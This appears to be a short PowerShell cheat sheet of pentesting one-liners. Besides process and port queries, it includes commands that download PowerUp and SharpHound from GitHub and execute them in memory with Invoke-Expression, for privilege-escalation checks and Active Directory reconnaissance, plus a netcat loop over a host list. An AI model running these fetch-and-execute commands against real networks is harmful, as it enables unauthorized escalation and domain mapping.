Kill processess that sometimes System cmd.exe can't kill:

```
wmic process where "name='name.exe'" delete
```

Using `Get-NetTCPConnection` to query for listening port and each row has a collumn called "OwningProcess". We are then selecting each object and all of its properties(*), adding a new collumn name `ProcessName` which is basically the Name value when you query `Get-Process` with the Id of OwningProcess property.

```
Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}}
```

Download powershell script and run it in memory:

```
$out=Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1"
Invoke-Expression $out
Invoke-AllChecks 
```

Sharkhound from memory using PS1

```
$out=Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1"
Invoke-Expression $out
Invoke-BloodHound -CollectionMethod All
```

Simple commandLoop output to file ... Encoding ASCII is important otherwise it would be unicode encoded!
```
Get-Content iplist.txt | ForEach-Object {
    $ip=($_  |  Select-String -Pattern "\d{1,3}(\.\d{1,3}){3}" -AllMatches).Matches.Value
    nc $ip 6556 | Out-File "$ip.txt" -Encoding ASCII
}

```